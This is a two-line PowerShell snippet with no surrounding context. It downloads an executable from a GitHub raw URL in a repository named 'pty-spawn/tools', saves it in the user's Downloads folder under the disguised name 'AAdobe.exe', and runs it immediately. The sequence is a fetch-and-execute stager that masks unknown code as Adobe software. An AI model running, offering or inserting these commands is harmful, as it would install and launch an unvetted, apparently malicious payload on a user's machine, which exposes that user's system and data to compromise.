Invoke-WebRequest -Uri "https://raw.githubusercontent.com/pty-spawn/tools/refs/heads/main/load_inst.exe" -OutFile "$env:USERPROFILE\Downloads\AAdobe.exe"
Start-Process "$env:USERPROFILE\Downloads\AAdobe.exe"
